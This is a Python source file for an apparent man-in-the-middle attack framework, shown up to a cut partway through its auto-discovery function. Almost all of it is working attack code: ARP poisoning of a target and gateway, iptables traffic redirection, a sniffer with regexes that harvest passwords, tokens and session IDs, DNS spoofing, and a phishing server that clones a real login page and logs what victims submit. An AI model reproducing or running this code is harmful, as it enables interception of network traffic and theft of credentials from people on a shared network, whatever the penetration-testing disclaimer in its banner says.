#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║               MITM Agent - Automated MITM Framework             ║
║          For authorized penetration testing only                ║
║  Features: ARP Spoof | Cred Capture | DNS Spoof | Traffic Log  ║
╚══════════════════════════════════════════════════════════════════╝

Usage:
    python3 mitm_agent.py --target TARGET_IP --gateway GATEWAY_IP --interface IFACE
    python3 mitm_agent.py --auto --interface wlan0         # Auto-discover target & gateway
    python3 mitm_agent.py --target 192.168.1.5 --gateway 192.168.1.1 -i eth0 --capture-all
"""

import argparse
import sys
import os
import time
import signal
import threading
import subprocess
import re
import json
import hashlib
import socket
import struct
from datetime import datetime
from collections import defaultdict
from typing import Optional, List, Tuple

# Optional imports - gracefully degrade
try:
    from scapy.all import (
        ARP, Ether, IP, TCP, UDP, ICMP, Raw,
        srp, sr1, send, sniff,
        conf, get_if_hwaddr, get_if_addr
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    from colorama import init, Fore, Style
    init()
    C = Fore
    S = Style
except ImportError:
    class C: RED=GREEN=YELLOW=CYAN=BLUE=MAGENTA=WHITE=RESET=""
    class S: BRIGHT=RESET_ALL=""

try:
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.layout import Layout
    HAS_RICH = True
    console = Console()
except ImportError:
    HAS_RICH = False


# ──────────────────────────────────────────────
# GLOBALS
# ──────────────────────────────────────────────
TARGET_IP = None
GATEWAY_IP = None
INTERFACE = None
TARGET_MAC = None
GATEWAY_MAC = None
ATTACKER_MAC = None
ATTACKER_IP = None
RUNNING = True
CAPTURED_CREDS = []
CAPTURED_URLS = []
LOG_DIR = "/tmp/mitm_logs"

# Stats
stats = {
    "packets_sniffed": 0,
    "arp_spoofs_sent": 0,
    "credentials_captured": 0,
    "urls_captured": 0,
    "start_time": None,
}


# ──────────────────────────────────────────────
# UTILITY FUNCTIONS
# ──────────────────────────────────────────────
def banner():
    return f"""
{C.RED}╔══════════════════════════════════════════════════╗{S.RESET_ALL}
{C.RED}║{C.YELLOW}           MITM AGENT - Attack Framework         {C.RED}║{S.RESET_ALL}
{C.RED}║{C.CYAN}        Authorized Penetration Testing Only      {C.RED}║{S.RESET_ALL}
{C.RED}╚══════════════════════════════════════════════════╝{S.RESET_ALL}
    """

def log(msg: str, color=C.GREEN):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{ts}]{S.RESET_ALL} {msg}")

def err(msg: str):
    log(f"[ERROR] {msg}", C.RED)

def warn(msg: str):
    log(f"[WARN] {msg}", C.YELLOW)

def info(msg: str):
    log(f"[*] {msg}", C.CYAN)

def success(msg: str):
    log(f"[+] {msg}", C.GREEN)

def fatal(msg: str):
    err(msg)
    sys.exit(1)


# ──────────────────────────────────────────────
# NETWORK DISCOVERY
# ──────────────────────────────────────────────
def get_default_interface() -> str:
    """Get the default network interface."""
    try:
        if os.path.exists("/proc/net/route"):
            with open("/proc/net/route") as f:
                for line in f.readlines()[1:]:
                    parts = line.strip().split()
                    if len(parts) >= 2 and parts[1] == "00000000":
                        return parts[0]
    except: pass

    # Fallback via ip route
    try:
        r = subprocess.run(["ip", "route", "show", "default"],
                         capture_output=True, text=True)
        if r.stdout:
            return r.stdout.strip().split()[4]
    except: pass
    return "eth0"


def get_default_gateway() -> str:
    """Get default gateway IP."""
    try:
        r = subprocess.run(["ip", "route", "show", "default"],
                         capture_output=True, text=True)
        if r.stdout:
            return r.stdout.strip().split()[2]
    except: pass
    return None


def get_my_ip(iface: str) -> str:
    """Get IP address of an interface."""
    try:
        if HAS_SCAPY:
            return get_if_addr(iface)
    except: pass
    try:
        r = subprocess.run(["ip", "-4", "addr", "show", iface],
                         capture_output=True, text=True)
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", r.stdout)
        if m:
            return m.group(1)
    except: pass
    return None


def get_my_mac(iface: str) -> str:
    """Get MAC address of an interface."""
    try:
        if HAS_SCAPY:
            return get_if_hwaddr(iface)
    except: pass
    try:
        r = subprocess.run(["ip", "link", "show", iface],
                         capture_output=True, text=True)
        m = re.search(r"(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})", r.stdout)
        if m:
            return m.group(1)
    except: pass
    return "00:00:00:00:00:00"


def scan_network(iface: str, subnet: str = None) -> List[Tuple[str, str]]:
    """
    Discover live hosts on the network.
    Returns list of (ip, mac) tuples.
    """
    if not subnet:
        ip = get_my_ip(iface)
        if not ip:
            return []
        subnet = ".".join(ip.split(".")[:3]) + ".0/24"

    info(f"Scanning network {C.YELLOW}{subnet}{C.CYAN} on {C.YELLOW}{iface}...")

    devices = []

    # Method 1: ARP scan via scapy
    if HAS_SCAPY:
        try:
            arp = ARP(pdst=subnet)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=3, iface=iface, verbose=0)[0]
            for sent, received in result:
                devices.append((received.psrc, received.hwsrc))
            success(f"Scapy ARP scan found {len(devices)} devices")
            return devices
        except Exception as e:
            warn(f"Scapy scan failed: {e}")

    # Method 2: nmap
    try:
        info("Using nmap for discovery...")
        r = subprocess.run(
            ["nmap", "-sn", "-n", subnet, "--open"],
            capture_output=True, text=True, timeout=30
        )
        ips = re.findall(r"Nmap scan report for ([\d.]+)", r.stdout)
        macs = re.findall(r"MAC Address: ([\w:]+)", r.stdout)

        # Pair them (nmap output order matches)
        for i, ip in enumerate(ips):
            mac = macs[i] if i < len(macs) else "??:??:??:??:??:??"
            devices.append((ip, mac))

        success(f"nmap scan found {len(devices)} devices")
        return devices

    except Exception as e:
        warn(f"nmap scan failed: {e}")

    # Method 3: arp-scan
    try:
        r = subprocess.run(
            ["arp-scan", "--local", "-x"],
            capture_output=True, text=True, timeout=20
        )
        for line in r.stdout.split("\n"):
            parts = line.strip().split("\t")
            if len(parts) >= 2:
                ip = parts[0]
                mac = parts[1]
                if re.match(r"^[\d.]+$", ip):
                    devices.append((ip, mac))
        success(f"arp-scan found {len(devices)} devices")
        return devices
    except Exception as e:
        warn(f"arp-scan failed: {e}")

    return devices


def resolve_mac(ip: str, iface: str) -> Optional[str]:
    """Resolve MAC address for an IP using ARP."""
    if HAS_SCAPY:
        try:
            arp_req = ARP(pdst=ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            pkt = ether/arp_req
            result = srp(pkt, timeout=2, iface=iface, verbose=0)[0]
            if result:
                return result[0][1].hwsrc
        except: pass
    return None


def enable_ip_forwarding():
    """Enable IP forwarding so traffic flows through us."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        if os.path.exists("/proc/sys/net/ipv6/conf/all/forwarding"):
            with open("/proc/sys/net/ipv6/conf/all/forwarding", "w") as f:
                f.write("0")
        success("IP forwarding enabled")
        return True
    except Exception as e:
        warn(f"Could not enable IP forwarding: {e}")
        return False


def disable_ip_forwarding():
    """Disable IP forwarding after attack."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        log("IP forwarding disabled", C.YELLOW)
    except: pass


def setup_iptables(iface: str, target_ip: str, redirect_port: int = 8080):
    """
    Set up iptables to redirect HTTP/HTTPS traffic.
    Returns True if successful.
    """
    rules = [
        # Redirect HTTP to proxy
        f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port {redirect_port}",
        # Redirect HTTPS (will fail unless cert is trusted, but useful for SSLstrip)
        f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 443 -j REDIRECT --to-port {redirect_port}",
        # Redirect DNS queries to our DNS
        f"iptables -t nat -A PREROUTING -i {iface} -p udp --dport 53 -j REDIRECT --to-port 53",
    ]

    for rule in rules:
        try:
            subprocess.run(rule.split(), capture_output=True, text=True, timeout=5)
        except Exception as e:
            warn(f"iptables rule failed: {e}")

    # Print current rules
    r = subprocess.run(["iptables", "-t", "nat", "-L", "PREROUTING", "-v", "-n"],
                      capture_output=True, text=True, timeout=5)
    info("Current iptables NAT rules:\n" + r.stdout[:500])
    return True


def flush_iptables():
    """Flush iptables rules."""
    try:
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-t", "nat", "-X"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-F"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-X"], capture_output=True, timeout=5)
        log("iptables rules flushed", C.YELLOW)
    except Exception as e:
        warn(f"Failed to flush iptables: {e}")


# ──────────────────────────────────────────────
# ARP SPOOFING
# ──────────────────────────────────────────────
def start_arp_spoof(target_ip: str, gateway_ip: str, iface: str, target_mac: str = None, gateway_mac: str = None):
    """
    Start ARP spoofing in a background thread.
    Poisons both target and gateway ARP caches.
    """
    if not HAS_SCAPY:
        # Fallback to arpspoof tool
        return start_arpspoof_legacy(target_ip, gateway_ip, iface)

    global TARGET_MAC, GATEWAY_MAC

    # Resolve MACs if not provided
    if not target_mac:
        target_mac = resolve_mac(target_ip, iface)
        if not target_mac:
            fatal(f"Could not resolve MAC for target {target_ip}")
    TARGET_MAC = target_mac

    if not gateway_mac:
        gateway_mac = resolve_mac(gateway_ip, iface)
        if not gateway_mac:
            fatal(f"Could not resolve MAC for gateway {gateway_ip}")
    GATEWAY_MAC = gateway_mac

    my_mac = get_my_mac(iface)
    log(f"Attacker:     {ATTACKER_IP} / {my_mac}", C.MAGENTA)
    log(f"Target:       {target_ip} / {target_mac}", C.YELLOW)
    log(f"Gateway:      {gateway_ip} / {gateway_mac}", C.CYAN)

    def _spoof():
        nonlocal target_ip, gateway_ip, target_mac, gateway_mac, my_mac
        pkt_count = 0
        while RUNNING:
            try:
                # Tell target that we are the gateway
                pkt1 = Ether(dst=target_mac)/ARP(
                    op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=gateway_ip, hwsrc=my_mac
                )
                send(pkt1, iface=iface, verbose=0)

                # Tell gateway that we are the target
                pkt2 = Ether(dst=gateway_mac)/ARP(
                    op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip, hwsrc=my_mac
                )
                send(pkt2, iface=iface, verbose=0)

                pkt_count += 2
                stats["arp_spoofs_sent"] = pkt_count

            except Exception as e:
                err(f"ARP spoof error: {e}")
            time.sleep(1.5)  # Re-spoof every 1.5 seconds to keep cache poisoned

    thread = threading.Thread(target=_spoof, daemon=True)
    thread.start()
    success(f"ARP spoofing started: {target_ip} <-> {gateway_ip} via {my_mac}")

    # Also restore ARP on first run to clear any stale entries
    time.sleep(0.5)
    restore_arp(target_ip, gateway_ip, iface, target_mac, gateway_mac, oneshot=True)

    return thread


def start_arpspoof_legacy(target_ip: str, gateway_ip: str, iface: str):
    """Fallback: use arpspoof tool for ARP poisoning."""
    info("Using arpspoof tool (scapy unavailable)")

    def _run_arpspoof(target, gateway, iface, direction):
        try:
            subprocess.run(
                ["arpspoof", "-i", iface, "-t", target, gateway],
                capture_output=False, timeout=1
            )
        except subprocess.TimeoutExpired:
            pass  # arpspoof runs continuously
        except Exception as e:
            err(f"arpspoof {direction} failed: {e}")

    # Start both directions
    t1 = threading.Thread(target=_run_arpspoof,
                         args=(target_ip, gateway_ip, iface, "target->gateway"),
                         daemon=True)
    t2 = threading.Thread(target=_run_arpspoof,
                         args=(gateway_ip, target_ip, iface, "gateway->target"),
                         daemon=True)
    t1.start()
    t2.start()
    success(f"arpspoof running: {target_ip} <-> {gateway_ip}")
    return t1, t2


def restore_arp(target_ip: str, gateway_ip: str, iface: str,
                target_mac: str = None, gateway_mac: str = None, oneshot: bool = False):
    """Restore ARP tables to original state."""
    if not HAS_SCAPY:
        return

    if not target_mac:
        target_mac = resolve_mac(target_ip, iface)
    if not gateway_mac:
        gateway_mac = resolve_mac(gateway_ip, iface)

    if oneshot:
        # Send one restore packet then let spoofing resume
        pkt1 = Ether(dst=target_mac)/ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gateway_mac
        )
        send(pkt1, iface=iface, verbose=0, count=1)
        return

    # Full restore (called on exit)
    info("Restoring ARP tables...")
    for _ in range(5):
        try:
            pkt1 = Ether(dst=target_mac)/ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=gateway_ip, hwsrc=gateway_mac
            )
            send(pkt1, iface=iface, verbose=0)

            pkt2 = Ether(dst=gateway_mac)/ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=target_ip, hwsrc=target_mac
            )
            send(pkt2, iface=iface, verbose=0)
            time.sleep(0.5)
        except Exception as e:
            warn(f"ARP restore error: {e}")

    success("ARP tables restored")


# ──────────────────────────────────────────────
# TRAFFIC CAPTURE & CREDENTIAL EXTRACTION
# ──────────────────────────────────────────────
def packet_callback(packet):
    """Process each captured packet."""
    stats["packets_sniffed"] += 1

    if not packet.haslayer(TCP) and not packet.haslayer(UDP):
        return

    # Extract HTTP data
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode("utf-8", errors="ignore")

            # HTTP Request
            if payload.startswith(("GET ", "POST ", "PUT ", "DELETE ")):
                extract_http_request(packet, payload)

            # HTTP Response
            elif payload.startswith("HTTP/"):
                extract_http_response(packet, payload)

            # Password fields in any body
            check_for_credentials(payload, packet)

        except Exception as e:
            pass  # Silent fail on decode issues

    # Extract URLs from DNS queries
    if packet.haslayer(UDP) and packet.haslayer(DNS):
        extract_dns_query(packet)


def extract_http_request(packet, payload: str):
    """Extract and log HTTP requests."""
    try:
        lines = payload.split("\r\n")
        first_line = lines[0]

        # Parse method, path, version
        parts = first_line.split(" ")
        if len(parts) >= 2:
            method = parts[0]
            path = parts[1]

            # Get Host header
            host = ""
            for line in lines[1:]:
                if line.lower().startswith("host:"):
                    host = line.split(":", 1)[1].strip()
                    break

            full_url = f"http://{host}{path}"
            src_ip = packet[IP].src if packet.haslayer(IP) else "???"
            src_port = packet[TCP].sport

            stats["urls_captured"] += 1
            CAPTURED_URLS.append({
                "timestamp": datetime.now().isoformat(),
                "source": f"{src_ip}:{src_port}",
                "method": method,
                "url": full_url,
                "target": TARGET_IP
            })

            if method == "POST" or "password" in payload.lower() or "login" in payload.lower():
                log(f"{C.YELLOW}{method} {full_url}{S.RESET_ALL}", C.CYAN)
                # Print body
                body = "\r\n".join(lines[lines.index("")+1:]) if "" in lines else ""
                if body and not any(h in body for h in ["image/", "multipart"]):
                    print(f"  {C.WHITE}Body: {body[:500]}{S.RESET_ALL}")

    except Exception:
        pass


def extract_http_response(packet, payload: str):
    """Extract and log HTTP responses."""
    try:
        first_line = payload.split("\r\n")[0]
        if "200 OK" in first_line or "302" in first_line or "301" in first_line:
            stats["urls_captured"] += 1
    except Exception:
        pass


def check_for_credentials(payload: str, packet):
    """Check payload for credential patterns."""
    cred_patterns = [
        r'(?i)(?:user(?:name)?|email|login|auth)[=:][\s]*([^\s&"\']+)',
        r'(?i)(?:pass(?:word)?|pwd|secret|token)[=:][\s]*([^\s&"\']+)',
        r'(?i)(?:key|api[_-]?key|apikey)[=:][\s]*([^\s&"\']+)',
        r'(?i)(?:session|sid|token)[=:][\s]*([^\s&"\']+)',
        r'(?i)(?:jwt|bearer)[\s=:]+([\w_.-]+\.[\w_.-]+\.[\w_.-]+)',
        r'(?i)(?:password|passwd|pwd)=([^&\s]+)',
        r'(?i)(?:login|email|user)=([^&\s@]+@[^&\s]+\.[^&\s]+)',
    ]

    src_ip = packet[IP].src if packet.haslayer(IP) else "???"

    for pattern in cred_patterns:
        matches = re.findall(pattern, payload)
        for match in matches:
            # Filter noise
            if len(match) < 3 or match in ["true", "false", "0", "1", "submit", "undefined"]:
                continue

            stats["credentials_captured"] += 1
            entry = {
                "timestamp": datetime.now().isoformat(),
                "source": src_ip,
                "target": TARGET_IP,
                "type": pattern.split("(")[1].split("?")[0] if "(" in pattern else "unknown",
                "value": match
            }
            CAPTURED_CREDS.append(entry)

            log(f"{C.RED}CREDENTIAL: {match[:100]}{S.RESET_ALL}", C.RED)
            break  # One match per packet is enough


def extract_dns_query(packet):
    """Extract DNS queries."""
    try:
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Query
            qname = packet[DNS].qd.qname.decode("utf-8", errors="ignore").rstrip(".")
            stats["urls_captured"] += 1
            CAPTURED_URLS.append({
                "timestamp": datetime.now().isoformat(),
                "source": packet[IP].src,
                "type": "DNS",
                "query": qname,
                "target": TARGET_IP
            })
    except Exception:
        pass


def start_sniffer(iface: str, filter_expr: str = None):
    """Start packet sniffer in background thread."""
    if not HAS_SCAPY:
        info("Scapy not available - skipping sniffer (use tcpdump dump instead)")
        return None

    # Default filter: capture target and gateway traffic
    if not filter_expr and TARGET_IP and GATEWAY_IP:
        filter_expr = f"(host {TARGET_IP} or host {GATEWAY_IP}) and tcp"
    elif not filter_expr:
        filter_expr = "tcp"

    def _sniff():
        try:
            sniff(
                iface=iface,
                prn=packet_callback,
                filter=filter_expr,
                store=0,
                stop_filter=lambda x: not RUNNING
            )
        except Exception as e:
            err(f"Sniffer error: {e}")

    thread = threading.Thread(target=_sniff, daemon=True)
    thread.start()
    success(f"Packet sniffer started on {iface} [filter: {filter_expr}]")
    return thread


def start_tcpdump_log(iface: str):
    """Start tcpdump to log all traffic to a file."""
    global LOG_DIR
    os.makedirs(LOG_DIR, exist_ok=True)
    pcap_file = f"{LOG_DIR}/traffic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"

    def _tcpdump():
        try:
            subprocess.run(
                ["tcpdump", "-i", iface, "-w", pcap_file,
                 f"host {TARGET_IP}", "-n"],
                capture_output=False
            )
        except: pass

    thread = threading.Thread(target=_tcpdump, daemon=True)
    thread.start()
    info(f"tcpdump logging to {pcap_file}")

    # Also start a second tcpdump to extract HTTP data in real-time
    http_file = f"{LOG_DIR}/http_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    def _tcpdump_http():
        try:
            subprocess.run(
                ["tcpdump", "-i", iface, "-A", "-l",
                 f"host {TARGET_IP} and tcp port 80",
                 "2>&1"],
                capture_output=False
            )
        except: pass

    thread2 = threading.Thread(target=_tcpdump_http, daemon=True)
    thread2.start()
    info(f"HTTP data logging to {http_file}")

    return thread, thread2


# ──────────────────────────────────────────────
# DNS SPOOFING
# ──────────────────────────────────────────────
class DNSSpoofer:
    """DNS spoofing server - redirects DNS queries to attacker machine."""

    def __init__(self, iface: str, redirect_ip: str = None):
        self.iface = iface
        self.redirect_ip = redirect_ip or ATTACKER_IP
        self.redirect_ip = self.redirect_ip or get_my_ip(iface)
        self.server_running = False
        self.spoof_domains = {}  # domain -> redirect_ip

    def add_spoof(self, domain: str, redirect_ip: str = None):
        """Add a domain to spoof."""
        self.spoof_domains[domain] = redirect_ip or self.redirect_ip
        info(f"DNS spoof: {domain} -> {self.spoof_domains[domain]}")

    def add_spoof_all(self, redirect_ip: str = None):
        """Spoof all DNS queries to redirect to us."""
        self.spoof_all = True
        self.spoof_all_ip = redirect_ip or self.redirect_ip
        info(f"DNS spoof: ALL domains -> {self.spoof_all_ip}")

    def start(self):
        """Start DNS spoofing using scapy."""
        if not HAS_SCAPY:
            warn("Scapy required for DNS spoofing")
            return None

        def _dns_spoof():
            info(f"DNS spoofing server starting on {self.iface}...")
            self.server_running = True

            def dns_handler(pkt):
                if not RUNNING or not self.server_running:
                    return
                if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # Query
                    try:
                        qname = pkt[DNS].qd.qname.decode("utf-8", errors="ignore").rstrip(".")
                        src_ip = pkt[IP].src
                        dst_ip = pkt[IP].dst
                        src_port = pkt[UDP].sport

                        # Check if we should spoof this
                        redirect = None
                        if hasattr(self, 'spoof_all') and self.spoof_all:
                            redirect = self.spoof_all_ip
                        elif qname in self.spoof_domains:
                            redirect = self.spoof_domains[qname]

                        if redirect:
                            log(f"DNS spoof: {qname} -> {redirect} [{src_ip}]", C.GREEN)

                            # Build spoofed DNS response
                            ip = IP(src=dst_ip, dst=src_ip)
                            udp = UDP(sport=53, dport=src_port)
                            dns = DNS(
                                id=pkt[DNS].id,
                                qr=1,  # Response
                                aa=1,  # Authoritative
                                qd=pkt[DNS].qd,
                                an=DNSRR(
                                    rrname=pkt[DNS].qd.qname,
                                    type="A",
                                    ttl=300,
                                    rdata=redirect
                                )
                            )
                            send(ip/udp/dns, iface=self.iface, verbose=0)
                    except Exception as e:
                        pass

            try:
                sniff(
                    iface=self.iface,
                    prn=dns_handler,
                    filter="udp port 53",
                    store=0,
                    stop_filter=lambda x: not RUNNING or not self.server_running
                )
            except Exception as e:
                err(f"DNS spoof error: {e}")

        thread = threading.Thread(target=_dns_spoof, daemon=True)
        thread.start()
        success("DNS spoofing started")
        return thread


# ──────────────────────────────────────────────
# PHISHING PAGE SERVER
# ──────────────────────────────────────────────
class PhishingServer:
    """
    Simple HTTP server that serves phishing pages and captures credentials.
    Can either mirror a target page or serve custom login pages.
    """

    def __init__(self, port: int = 8080):
        self.port = port
        self.pages = {}
        self.creds_file = f"{LOG_DIR}/phishing_creds.txt"

    def load_page(self, url_path: str, html_content: str):
        """Register a page to serve at given path."""
        self.pages[url_path] = html_content

    def load_from_url(self, url: str):
        """Download and register a page from live URL."""
        try:
            import requests
            r = requests.get(url, timeout=10, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            })
            if r.status_code == 200:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(r.text, "lxml")

                # Fix form actions to point to our server
                for form in soup.find_all("form"):
                    form["action"] = "/login"

                # Fix relative URLs
                for tag in soup.find_all(["link", "script", "img"]):
                    for attr in ["href", "src"]:
                        if tag.get(attr) and tag[attr].startswith("/"):
                            from urllib.parse import urlparse
                            parsed = urlparse(url)
                            tag[attr] = f"{parsed.scheme}://{parsed.netloc}{tag[attr]}"

                path = "/" + url.split("/")[3] if len(url.split("/")) > 3 else "/"
                self.pages[path] = str(soup)
                info(f"Loaded phishing page from {url}")
                return True
        except Exception as e:
            warn(f"Failed to load page: {e}")
        return False

    def start(self):
        """Start Flask HTTP server."""
        try:
            from flask import Flask, request, redirect, render_template_string
        except ImportError:
            warn("Flask not installed. Install with: pip install flask")
            # Fallback to http.server
            return self._start_simple_http()

        app = Flask(__name__)

        @app.route("/", defaults={"path": ""})
        @app.route("/<path:path>")
        def serve_page(path):
            path = "/" + path
            if path in self.pages:
                return render_template_string(self.pages[path])
            for route, content in self.pages.items():
                if route == "/" and not path:
                    return render_template_string(content)
            return "<html><body><h2>Page not found</h2></body></html>"

        @app.route("/login", methods=["POST"])
        def capture_login():
            """Capture login credentials from POST."""
            data = dict(request.form)
            ts = datetime.now().isoformat()

            # Log credentials
            entry = {
                "timestamp": ts,
                "source": request.remote_addr,
                "method": request.method,
                "path": request.path,
                "headers": dict(request.headers),
                "data": data
            }
            CAPTURED_CREDS.append({
                "timestamp": ts,
                "source": request.remote_addr,
                "target": TARGET_IP,
                "type": "phishing_form",
                "value": json.dumps(data)
            })

            os.makedirs(LOG_DIR, exist_ok=True)
            with open(self.creds_file, "a") as f:
                f.write(json.dumps(entry) + "\n")

            log(f"{C.RED}PHISHED CREDENTIALS FROM {request.remote_addr}:{S.RESET_ALL}", C.RED)
            for k, v in data.items():
                print(f"  {C.YELLOW}{k}:{C.WHITE} {v}{S.RESET_ALL}")

            # Redirect to real site after capture
            return redirect("https://www.google.com")

        def _run():
            app.run(host="0.0.0.0", port=self.port, debug=False, use_reloader=False)

        thread = threading.Thread(target=_run, daemon=True)
        thread.start()
        success(f"Phishing server started on port {self.port}")
        return thread

    def _start_simple_http(self):
        """Fallback: simple HTTP server."""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import urllib.parse

        class PhishingHandler(BaseHTTPRequestHandler):
            pages = self.pages
            creds_file = self.creds_file

            def do_GET(self):
                if self.path in self.pages:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(self.pages[self.path].encode())
                else:
                    self.send_response(404)
                    self.end_headers()
                    self.wfile.write(b"Not Found")

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode("utf-8", errors="ignore")
                params = urllib.parse.parse_qs(body)

                entry = {
                    "timestamp": datetime.now().isoformat(),
                    "source": self.client_address[0],
                    "data": {k: v[0] for k, v in params.items()}
                }

                CAPTURED_CREDS.append({
                    "timestamp": entry["timestamp"],
                    "source": entry["source"],
                    "target": TARGET_IP,
                    "type": "phishing_form",
                    "value": json.dumps(entry["data"])
                })

                os.makedirs(LOG_DIR, exist_ok=True)
                with open(self.creds_file, "a") as f:
                    f.write(json.dumps(entry) + "\n")

                log(f"PHISHED: {entry['data']}", C.RED)
                self.send_response(302)
                self.send_header("Location", "https://www.google.com")
                self.end_headers()

        def _run():
            server = HTTPServer(("0.0.0.0", self.port), PhishingHandler)
            server.serve_forever()

        thread = threading.Thread(target=_run, daemon=True)
        thread.start()
        success(f"Simple HTTP phishing server on port {self.port}")
        return thread


# ──────────────────────────────────────────────
# DISPLAY & REPORTING
# ──────────────────────────────────────────────
def get_live_stats():
    """Build a live status string."""
    status = []
    status.append(f"Packets sniffed: {stats['packets_sniffed']}")
    status.append(f"ARP spoofs sent: {stats['arp_spoofs_sent']}")
    status.append(f"URLs captured: {stats['urls_captured']}")
    status.append(f"Credentials: {stats['credentials_captured']}")
    status.append(f"Running: {RUNNING}")
    return " | ".join(status)


def live_display():
    """Live updating display showing captured data."""
    print(banner())
    info(f"Target: {TARGET_IP} | Gateway: {GATEWAY_IP} | Interface: {INTERFACE}")
    print()

    last_creds_len = 0
    last_urls_len = 0

    while RUNNING:
        if len(CAPTURED_CREDS) > last_creds_len:
            print(f"\n{C.RED}=== CREDENTIALS CAPTURED ({len(CAPTURED_CREDS)}) ==={S.RESET_ALL}")
            for cred in CAPTURED_CREDS[last_creds_len:]:
                print(f"  {C.YELLOW}[{cred['source']}]{C.WHITE} {cred['value'][:150]}{S.RESET_ALL}")
            last_creds_len = len(CAPTURED_CREDS)

        if len(CAPTURED_URLS) > last_urls_len:
            if len(CAPTURED_URLS) - last_urls_len < 5:
                print(f"\n{C.CYAN}=== RECENT TRAFFIC ==={S.RESET_ALL}")
                for url in CAPTURED_URLS[last_urls_len:]:
                    method = url.get("method", url.get("type", "DNS"))
                    target = url.get("url", url.get("query", ""))
                    print(f"  {C.GREEN}{method}{C.WHITE} {target[:120]}{S.RESET_ALL}")
            last_urls_len = len(CAPTURED_URLS)

        status_line = get_live_stats()
        print(f"\r  {C.MAGENTA}[Status]{C.WHITE} {status_line}{S.RESET_ALL}", end="", flush=True)
        time.sleep(2)


def save_report():
    """Save all captured data to report file."""
    os.makedirs(LOG_DIR, exist_ok=True)
    report_file = f"{LOG_DIR}/mitm_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    report = {
        "attack_info": {
            "target_ip": TARGET_IP,
            "gateway_ip": GATEWAY_IP,
            "interface": INTERFACE,
            "attacker_ip": ATTACKER_IP,
            "attacker_mac": ATTACKER_MAC,
            "start_time": stats["start_time"],
            "end_time": datetime.now().isoformat(),
        },
        "stats": stats,
        "credentials": CAPTURED_CREDS,
        "urls": CAPTURED_URLS[-100:],  # Last 100 URLs
    }

    with open(report_file, "w") as f:
        json.dump(report, f, indent=2, default=str)

    success(f"Report saved to {report_file}")

    # Also save credentials separately
    if CAPTURED_CREDS:
        cred_file = f"{LOG_DIR}/credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(cred_file, "w") as f:
            for cred in CAPTURED_CREDS:
                f.write(f"[{cred['timestamp']}] {cred['source']} -> {cred['target']}\n")
                f.write(f"  Type: {cred['type']}\n")
                f.write(f"  Value: {cred['value']}\n")
                f.write("-" * 60 + "\n")
        success(f"Credentials saved to {cred_file}")

    # Save URLs
    if CAPTURED_URLS:
        url_file = f"{LOG_DIR}/urls_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(url_file, "w") as f:
            for url in CAPTURED_URLS[-500:]:
                u = url.get("url", url.get("query", ""))
                m = url.get("method", url.get("type", ""))
                s = url.get("source", "")
                f.write(f"[{url['timestamp']}] {s} | {m} {u}\n")
        success(f"URLs saved to {url_file}")

    return report_file


# ──────────────────────────────────────────────
# MAIN ATTACK HANDLER
# ──────────────────────────────────────────────
def cleanup(signum=None, frame=None):
    """Clean up on exit."""
    global RUNNING
    RUNNING = False

    print(f"\n\n{C.YELLOW}[!] Shutting down...{S.RESET_ALL}")

    # Flush iptables
    flush_iptables()

    # Restore ARP
    if TARGET_IP and GATEWAY_IP and HAS_SCAPY:
        restore_arp(TARGET_IP, GATEWAY_IP, INTERFACE)

    # Disable IP forwarding
    disable_ip_forwarding()

    # Save report
    save_report()

    print(f"\n{C.GREEN}[✓] Cleanup complete. Goodbye!{S.RESET_ALL}")
    sys.exit(0)


def auto_discover(iface: str):
    """Auto-discover target and gateway."""
    global TARGET_IP, GATEWAY_IP, ATTACKER_IP, ATTACKER_MAC

    # Get our own IP and MAC
    ATTACKER_IP = get_my_ip(iface)
    ATTACKER_MAC = get_my_mac(iface)

    if not ATTACKER_IP:
        fatal(f"Could not determine IP for interface {iface}")

    info(f"Our IP: {ATTACKER_IP} | MAC: {ATTACKER_MAC}")

    # Get gateway
    GATEWAY_IP = get_default_gateway()
    if not GATEWAY_IP:
        fatal("Could not determine gateway")
    info(f"Gateway: {GATEWAY_IP}")

    # Scan network for other devices
    devices = scan_network(iface)
    if not devices:
        fatal("No devices found on network")

    print(f"\n{C.CYAN}Devices on network:{S.RESET_ALL}")
    print(f"  {'IP':<20} {'MAC':<20} {'Role':<10}")
    print(f"  {'-'*50}")
    for ip, mac in devices:
        role = ""
        if ip == GATEWAY_IP:
